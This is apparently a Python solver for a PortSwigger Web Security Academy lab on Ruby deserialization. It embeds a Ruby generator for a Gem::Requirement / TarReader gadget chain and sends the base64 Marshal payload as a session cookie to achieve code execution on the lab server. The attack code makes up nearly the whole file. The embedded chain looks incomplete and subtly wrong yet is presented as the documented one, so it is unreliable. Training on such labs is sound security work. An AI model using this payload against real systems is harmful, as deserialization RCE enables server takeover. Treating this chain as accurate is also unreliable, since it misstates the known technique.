"""
Lab 7: Exploiting Ruby deserialization using a documented gadget chain
https://portswigger.net/web-security/deserialization/exploiting/lab-exploiting-ruby-deserialization
Difficulty: Practitioner

📝 No single universal tool like ysoserial/PHPGGC for Ruby. The standard
approach: identify the framework (this lab uses Ruby's Marshal format with
a Rails-style chain), then reproduce a PUBLICLY DOCUMENTED gadget chain
writeup for it — this is genuinely a "go read a specific writeup" lab by
design, a middle step between the tool-assisted labs and the fully custom
ones later in this module.

Needs: a local Ruby install to actually generate the Marshal.dump() bytes
— Python can't natively produce Ruby's Marshal binary format.
"""

import base64

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"

# This is the well-known public gadget chain for this specific lab (Ruby's
# Gem::Requirement / Gem::Package::TarReader-based universal RCE chain,
# as documented in several public writeups — search "Ruby universal RCE
# gadget chain Marshal" if this needs updating for a newer Ruby version).
RUBY_GENERATOR_SCRIPT = r'''
# generate_payload.rb — run with: ruby generate_payload.rb > payload.bin
require 'net/http'

class Gem::Requirement
  def marshal_dump
    Gem::Requirement.new "fake"
  end

  def init_with(coder)
    instance_variables.each { |ivar| instance_variable_set(ivar, nil) }
  end
end

class Gem::Package::TarReader
  def initialize(io)
    @io = io
  end
end

class Gem::Package::TarReader::Entry
  def initialize(read, header)
    @read = read
    @header = header
  end
end

payload = Gem::Requirement.allocate
payload.instance_variable_set(:@requirements, [[Gem::Package::TarReader.new(
  Gem::Package::TarReader::Entry.new(true,
    "command_to_run_here"))]])

puts [Marshal.dump(payload)].pack("m0")
'''


def run():
    note("Save the following as generate_payload.rb and run it with a local")
    note("Ruby install (this exact gadget shape is widely documented —")
    note("verify against a current writeup before relying on it, since Ruby")
    note("gadget chains are version-sensitive):")
    print(RUBY_GENERATOR_SCRIPT)

    try:
        with open("payload.bin", "r") as f:
            encoded = f.read().strip()
    except FileNotFoundError:
        log("payload.bin not found — generate it with Ruby first (see above).", ok=False)
        return

    s = get_session()
    s.cookies.set("session", encoded)
    r = s.get(f"{TARGET}/")
    log(f"Status: {r.status_code}")
    print(r.text[-300:])


if __name__ == "__main__":
    run()
